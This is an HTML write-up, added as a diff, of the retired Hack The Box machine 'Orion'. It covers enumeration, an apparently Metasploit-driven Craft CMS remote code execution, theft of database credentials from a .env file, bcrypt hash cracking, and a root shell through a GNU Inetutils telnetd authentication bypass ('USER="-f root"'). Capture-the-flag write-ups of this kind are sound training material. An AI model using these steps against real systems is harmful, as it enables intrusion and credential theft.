@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <title>Orion - HTB Report</title>
+    <link rel="stylesheet" href="../style.css">
+  </head>
+
+  <body>
+    <header>
+      <h1>Orion</h1>
+      <p>Hack The Box Retired Machine Report</p>
+    </header>
+
+    <main class="report">
+
+      <h2>Machine Info</h2>
+      <p><strong>Difficulty:</strong> Easy</p>
+      <p><strong>Operating System:</strong> Linux</p>
+      <p><strong>Status:</strong> Retired</p>
+      <p><strong>Date Started:</strong> 24 June 2026</p>
+      <p><strong>Date Completed:</strong> 24 June 2026</p>
+
+      <h2>Summary</h2>
+      <p>
+        Orion is a easy Linux machine that focuses on web enumeration, Craft CMS exploitation,
+        credential discovery, password cracking, and local privilege escalation through an exposed
+        Telnet service.
+      </p>
+
+      <p>
+        The attack chain began with identifying a Craft CMS web application running behind Nginx.
+        After discovering the Craft CMS admin portal, a vulnerable Craft CMS instance was exploited
+        to gain initial access as <code>www-data</code>. From there, database credentials were recovered
+        from the Craft configuration file, allowing access to the application database and extraction
+        of a bcrypt password hash for the user <code>adam</code>.
+      </p>
+
+      <p>
+        After cracking the password hash, SSH access was obtained as <code>adam</code>. Privilege
+        escalation was completed by identifying a local Telnet service running as root through
+        <code>inetd</code> and abusing a GNU Inetutils Telnet authentication bypass to obtain a root shell.
+      </p>
+
+      <h2>Reconnaissance</h2>
+
+      <h3>Nmap Scan</h3>
+      <pre><code>mkdir Orion && cd Orion
+mkdir loot nmap
+cd nmap
+nmap 10.129.244.146 -oA initial_nmap</code></pre>
+
+      <h3>Initial Open Ports</h3>
+
+      <table class="report-table">
+        <thead>
+          <tr>
+            <th>Port</th>
+            <th>Service</th>
+            <th>Notes</th>
+          </tr>
+        </thead>
+
+        <tbody>
+          <tr>
+            <td>22</td>
+            <td>SSH</td>
+            <td>Remote login service</td>
+          </tr>
+          <tr>
+            <td>80</td>
+            <td>HTTP</td>
+            <td>Web application hosted on Nginx</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <h3>Service Enumeration</h3>
+      <pre><code>nmap -sC -sV -p 22,80 10.129.244.146 -oA full_nmap</code></pre>
+
+      <h3>Detailed Open Ports</h3>
+
+      <table class="report-table">
+        <thead>
+          <tr>
+            <th>Port</th>
+            <th>Service</th>
+            <th>Version</th>
+            <th>Notes</th>
+          </tr>
+        </thead>
+
+        <tbody>
+          <tr>
+            <td>22</td>
+            <td>SSH</td>
+            <td>OpenSSH 8.9p1 Ubuntu</td>
+            <td>Ubuntu Linux SSH service</td>
+          </tr>
+          <tr>
+            <td>80</td>
+            <td>HTTP</td>
+            <td>Nginx 1.18.0</td>
+            <td>Redirected to <code>http://orion.htb/</code></td>
+          </tr>
+        </tbody>
+      </table>
+
+      <h3>Hosts File Update</h3>
+      <p>
+        The web server redirected traffic to <code>orion.htb</code>, so the hostname was added to
+        <code>/etc/hosts</code>.
+      </p>
+
+      <pre><code>echo "10.129.244.146 orion.htb" | sudo tee -a /etc/hosts</code></pre>
+
+      <h2>Web Enumeration</h2>
+
+      <h3>HTTP Headers</h3>
+      <p>
+        A header check showed that the web application was powered by Craft CMS.
+      </p>
+
+      <pre><code>curl -I orion.htb</code></pre>
+
+      <pre><code>HTTP/1.1 200 OK
+Server: nginx/1.18.0 (Ubuntu)
+Content-Type: text/html; charset=UTF-8
+X-Robots-Tag: none
+X-Powered-By: Craft CMS</code></pre>
+
+      <h3>Directory Enumeration</h3>
+      <p>
+        Gobuster discovered several interesting paths, including the Craft CMS admin login page.
+      </p>
+
+      <pre><code>gobuster dir -u http://orion.htb -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 200</code></pre>
+
+      <h3>Interesting Paths</h3>
+
+      <table class="report-table">
+        <thead>
+          <tr>
+            <th>Path</th>
+            <th>Status</th>
+            <th>Notes</th>
+          </tr>
+        </thead>
+
+        <tbody>
+          <tr>
+            <td><code>/admin</code></td>
+            <td>302</td>
+            <td>Redirected to <code>/admin/login</code></td>
+          </tr>
+          <tr>
+            <td><code>/assets</code></td>
+            <td>301</td>
+            <td>Assets directory</td>
+          </tr>
+          <tr>
+            <td><code>/index</code></td>
+            <td>200</td>
+            <td>Main web page</td>
+          </tr>
+          <tr>
+            <td><code>/index.php</code></td>
+            <td>200</td>
+            <td>Main PHP entry point</td>
+          </tr>
+          <tr>
+            <td><code>/wp-admin</code></td>
+            <td>418</td>
+            <td>Non-standard response; likely a decoy or custom route</td>
+          </tr>
+        </tbody>
+      </table>
+
+      <h2>Initial Access</h2>
+
+      <h3>Craft CMS Exploitation</h3>
+      <p>
+        Navigating to <code>http://orion.htb/admin/</code> revealed a Craft CMS login portal.
+        The page showed Craft CMS version <code>5.6.16</code>, which was vulnerable to a
+        pre-authenticated remote code execution issue.
+      </p>
+
+      <p>
+        Initial exploitation attempts failed because the module configuration did not match the
+        target correctly. The main issue was that requests were being made against the raw IP address
+        instead of the expected virtual host. After configuring the target to use
+        <code>orion.htb</code>, the exploit successfully interacted with the Craft CMS instance.
+      </p>
+
+      <p>
+        The exploit leaked the PHP session save path, confirmed exploitability, and executed the
+        payload successfully. This resulted in a shell as the web server user.
+      </p>
+
+      <pre><code>python3 -c "import pty; pty.spawn('/bin/bash')"
+
+www-data@orion:~/html/craft/web$ whoami
+www-data</code></pre>
+
+      <h2>Credential Discovery</h2>
+
+      <h3>Craft CMS Configuration File</h3>
+      <p>
+        After gaining access as <code>www-data</code>, the Craft CMS directory was inspected.
+        The <code>.env</code> file contained database configuration values, including the database
+        name, database user, and database password.
+      </p>
+
+      <pre><code>cd /var/www/html/craft
+cat .env</code></pre>
+
+      <pre><code>CRAFT_ENVIRONMENT=dev
+CRAFT_DEV_MODE=true
+CRAFT_ALLOW_ADMIN_CHANGES=true
+CRAFT_DB_DRIVER=mysql
+CRAFT_DB_SERVER=127.0.0.1
+CRAFT_DB_PORT=3306
+CRAFT_DB_DATABASE=orion
+CRAFT_DB_USER=root
+CRAFT_DB_PASSWORD=SuperSecureCraft123Pass!</code></pre>
+
+      <h3>Database Access</h3>
+      <p>
+        The recovered database credentials were used to connect to MariaDB locally.
+      </p>
+
+      <pre><code>mysql -u root -p orion</code></pre>
+
+      <p>
+        After authenticating, the Craft CMS database tables were listed and the
+        <code>users</code> table was inspected.
+      </p>
+
+      <pre><code>show tables;
+select * from users;</code></pre>
+
+      <h3>Recovered User Hash</h3>
+      <p>
+        The <code>users</code> table contained an administrator account for
+        <code>adam@orion.htb</code> with the username <code>admin</code>. A bcrypt hash was recovered
+        from the password field.
+      </p>
+
+      <pre><code>username: admin
+email: adam@orion.htb
+hash: $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS</code></pre>
+
+      <h2>Password Cracking</h2>
+
+      <p>
+        The recovered bcrypt hash was saved locally and cracked with Hashcat using the
+        <code>rockyou.txt</code> wordlist.
+      </p>
+
+      <pre><code>echo '$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS' > adam_hash.txt
+hashcat -m 3200 adam_hash.txt /usr/share/wordlists/rockyou.txt</code></pre>
+
+      <p><strong>Recovered Password:</strong> <code>darkangel</code></p>
+
+      <h2>User Access</h2>
+
+      <p>
+        The cracked password was used to authenticate over SSH as the user <code>adam</code>.
+      </p>
+
+      <pre><code>ssh adam@orion.htb</code></pre>
+
+      <p>
+        Once logged in, the user flag was retrieved from Adam's home directory.
+      </p>
+
+      <pre><code>adam@orion:~$ ls
+user.txt
+
+adam@orion:~$ cat user.txt
+REDACTED</code></pre>
+
+      <h2>Privilege Escalation</h2>
+
+      <h3>Initial Local Enumeration</h3>
+      <p>
+        After gaining access as <code>adam</code>, standard local enumeration was performed.
+        The user was not allowed to run commands with <code>sudo</code>.
+      </p>
+
+      <pre><code>whoami
+id
+sudo -l</code></pre>
+
+      <pre><code>uid=1000(adam) gid=1000(adam) groups=1000(adam)
+Sorry, user adam may not run sudo on orion.</code></pre>
+
+      <h3>SUID Enumeration</h3>
+      <p>
+        SUID binaries were checked, but the initially reviewed paths did not provide the intended
+        escalation route.
+      </p>
+
+      <pre><code>find / -perm -4000 -type f 2>/dev/null</code></pre>
+
+      <h3>Listening Services</h3>
+      <p>
+        Local listening services were reviewed using <code>ss</code>. This revealed that port
+        <code>23</code>, the Telnet service, was listening only on localhost.
+      </p>
+
+      <pre><code>ss -tulnp</code></pre>
+
+      <pre><code>127.0.0.1:23      LISTEN
+127.0.0.1:3306    LISTEN
+0.0.0.0:80        LISTEN
+0.0.0.0:22        LISTEN</code></pre>
+
+      <h3>Inetd Configuration</h3>
+      <p>
+        The Telnet service was configured through <code>inetd</code>. Reviewing
+        <code>/etc/inetd.conf</code> showed that Telnet was bound to localhost and configured
+        to run as <code>root</code>.
+      </p>
+
+      <pre><code>cat /etc/inetd.conf</code></pre>
+
+      <pre><code>127.0.0.1:telnet stream tcp nowait root /usr/local/sbin/telnetd telnetd</code></pre>
+
+      <p>
+        The Telnet daemon path was a symbolic link to <code>/usr/libexec/telnetd</code>.
+      </p>
+
+      <pre><code>ls -la /usr/local/sbin/telnetd
+file /usr/local/sbin/telnetd</code></pre>
+
+      <pre><code>/usr/local/sbin/telnetd -> /usr/libexec/telnetd</code></pre>
+
+      <h3>Telnet Version</h3>
+      <p>
+        The installed Telnet version was identified as GNU Inetutils 2.7.
+      </p>
+
+      <pre><code>telnet --version</code></pre>
+
+      <pre><code>telnet (GNU inetutils) 2.7</code></pre>
+
+      <h3>Telnet Authentication Bypass</h3>
+      <p>
+        GNU Inetutils Telnet was vulnerable to an authentication bypass issue. By setting the
+        <code>USER</code> environment variable to <code>-f root</code> and connecting to the local
+        Telnet service with automatic login, a root shell was obtained.
+      </p>
+
+      <pre><code>USER="-f root"
+telnet -a 127.0.0.1</code></pre>
+
+      <pre><code>Trying 127.0.0.1...
+Connected to 127.0.0.1.
+
+root@orion:~# whoami
+root</code></pre>
+
+      <h2>Root Access</h2>
+
+      <p>
+        With root access obtained through the local Telnet service, the root flag was retrieved from
+        the root user's home directory.
+      </p>
+
+      <pre><code>root@orion:~# cat root.txt
+REDACTED</code></pre>
+
+      <h2>Flags</h2>
+
+      <pre><code>user.txt: REDACTED
+root.txt: REDACTED</code></pre>
+
+      <h2>Tools Used</h2>
+      <ul>
+        <li>Nmap</li>
+        <li>curl</li>
+        <li>Gobuster</li>
+        <li>Searchsploit</li>
+        <li>Metasploit</li>
+        <li>MariaDB / MySQL client</li>
+        <li>Hashcat</li>
+        <li>SSH</li>
+        <li>LinPEAS</li>
+        <li>ss</li>
+        <li>Telnet</li>
+      </ul>
+
+      <h2>Lessons Learned</h2>
+      <p>
+        Orion demonstrated the importance of proper virtual host configuration during web exploitation.
+        The Craft CMS exploit initially failed because the requests were not aligned with the expected
+        application hostname. Once the correct hostname was used, the exploit worked as intended.
+      </p>
+
+      <p>
+        This machine also reinforced why sensitive configuration files should be protected carefully.
+        The Craft CMS <code>.env</code> file exposed database credentials, which allowed access to the
+        backend database and led to the recovery of a password hash for a valid user.
+      </p>
+
+      <p>
+        The privilege escalation path showed the risk of legacy or misconfigured local services.
+        Even though Telnet was only listening on localhost, it was running as root through
+        <code>inetd</code>. A vulnerable Telnet daemon allowed authentication bypass and resulted in
+        full root access.
+      </p>
+
+      <p>
+        Key defensive takeaways include keeping CMS platforms patched, avoiding exposed secrets in
+        application directories, using strong password hygiene, disabling unnecessary legacy services
+        like Telnet, and auditing local services that run with elevated privileges.
+      </p>
+
+      <p><a href="../index.html">Back to all reports</a></p>
+
+    </main>
+  </body>
+</html>
